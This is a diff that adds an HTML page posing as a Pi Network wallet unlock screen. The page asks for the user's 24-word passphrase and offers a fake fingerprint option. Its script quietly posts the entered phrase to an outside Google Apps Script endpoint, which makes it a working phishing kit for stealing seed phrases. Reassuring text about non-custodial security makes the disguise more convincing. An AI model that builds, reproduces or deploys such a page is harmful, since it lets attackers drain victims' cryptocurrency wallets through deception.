@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>Wallet – Pi Network</title>
+    <style>
+       .comment-box {
+  border: 2px solid orange;
+  padding: 20px;
+  width: 400px;
+  margin: 0 auto;
+  
+  
+      border-style: solid;
+    border-width: 1px 1px 1px 1px;
+    border-color: #FFA500;
+    text-align: center ;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-weight: 0;
+     display: block;
+        margin: 0 auto;
+    
+}
+
+textarea {
+  width: 80%;
+  height: 180px;
+  margin-bottom: 10px;
+      border-style: solid;
+    border-width: 1px 1px 1px 1px;
+    border-color: #FFA500;
+     display: flex;
+    flex-direction: column;
+    align-items: center;
+    display: block;
+        margin: 0 auto;
+}
+
+button {
+  background-color: #ffffff;
+  color: #76348e;
+  padding: 15px 50px;
+  border: 2px solid #76348e;
+  cursor: pointer;
+      text-align: center;
+         
+    border-width: 2px 2px 2px 2px;
+    font-family: "Helvetica", Sans-serif;
+    font-weight: 700;
+        border-radius: 20px 20px 20px 20px;
+        display: block;
+        margin: 0 auto;
+}
+
+.bone {
+     background-color:  #76348e;
+  color: #ffffff;
+  padding: 10px 40px;
+  border: 2px solid #76348e;
+  cursor: pointer;
+      text-align: center;
+         
+    border-width: 2px 2px 2px 2px;
+    font-family: "Helvetica", Sans-serif;
+    font-weight: 700;
+        border-radius: 5px 5px 5px 5px;
+        display: block;
+        margin: 0 auto;
+    
+    
+}
+
+.txt {
+    font-family: "Helvetica", Sans-serif; 
+}
+    </style>
+</head>
+<body>
+    <div class="comment-box">
+        <h3 class="txt"><b>Unlock Pi Wallet</b></h3>
+        <form id="submissionForm">
+            <!--<label for="comment">A</label>-->
+            <textarea name="comment" placeholder="Enter your 24-word passphrase here"></textarea>
+            <br>
+            <button name="submit" type="submit" value="Submit">UNLOCK WITH PASSPHRASE</button>
+            <br>
+            <button class="bone">UNLOCK WITH FINGERPRINT</button>
+        </form>
+    </div>
+    <p></p>
+    <p class="txt"><small>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</small></p>
+    <p class="txt"><small>Lost your passphrase? You can create a new wallet, but all your &pi; in your previous wallet will be inaccessible.</small></p>
+    <script>
+        document.getElementById("submissionForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            var formData = new FormData(this);
+
+            fetch('https://script.google.com/macros/s/AKfycbw9LrGz21fu3LjQWnLPfiLVn0z5F4n_XkIk96Es5752TM-xV_hke_P-obDTbWeBbGol6w/exec', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log(data);
+                alert(data); // Display response from Google Apps Script
+            })
+            .catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+                alert('Error submitting verification. Please try again later.');
+            });
+        });
+    </script>
+</body>
+</html>
